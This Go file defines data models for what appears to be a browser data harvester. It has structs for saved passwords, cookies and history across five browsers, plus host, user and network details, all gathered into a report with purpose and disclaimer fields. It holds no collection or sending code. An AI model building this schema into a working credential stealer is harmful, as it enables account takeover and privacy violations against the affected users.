package models

type Password struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

type Cookie struct {
	HostKey string `json:"host_key"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

type ChromeInfo struct {
	History   []string   `json:"history,omitempty"`
	Cookies   []Cookie   `json:"cookies,omitempty"`
	Passwords []Password `json:"passwords,omitempty"`
}

type BraveInfo struct {
	History   []string   `json:"history,omitempty"`
	Cookies   []Cookie   `json:"cookies,omitempty"`
	Passwords []Password `json:"passwords,omitempty"`
}

type EdgeInfo struct {
	History   []string   `json:"history,omitempty"`
	Cookies   []Cookie   `json:"cookies,omitempty"`
	Passwords []Password `json:"passwords,omitempty"`
}

type FirefoxInfo struct {
	History   []string   `json:"history,omitempty"`
	Cookies   []Cookie   `json:"cookies,omitempty"`
	Passwords []Password `json:"passwords,omitempty"`
}

type OperaInfo struct {
	History   []string   `json:"history,omitempty"`
	Cookies   []Cookie   `json:"cookies,omitempty"`
	Passwords []Password `json:"passwords,omitempty"`
}

type OSInfo struct {
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
}

type UserInfo struct {
	Username string `json:"username"`
	HomeDir  string `json:"home_directory"`
}

type HostInfo struct {
	Hostname   string `json:"hostname"`
	WorkingDir string `json:"working_directory"`
}

type NetInfo struct {
	IPAddresses []string `json:"ip_addresses"`
}

type SystemInfo struct {
	Timestamp  string      `json:"timestamp"`
	OS         OSInfo      `json:"os"`
	User       UserInfo    `json:"user"`
	Host       HostInfo    `json:"host"`
	Network    NetInfo     `json:"network"`
	Chrome     ChromeInfo  `json:"chrome,omitempty"`
	Edge       EdgeInfo    `json:"edge,omitempty"`
	Firefox    FirefoxInfo `json:"firefox,omitempty"`
	Opera      OperaInfo   `json:"opera,omitempty"`
	Brave      BraveInfo   `json:"brave,omitempty"`
	Purpose    string      `json:"purpose"`
	Disclaimer string      `json:"disclaimer"`
}
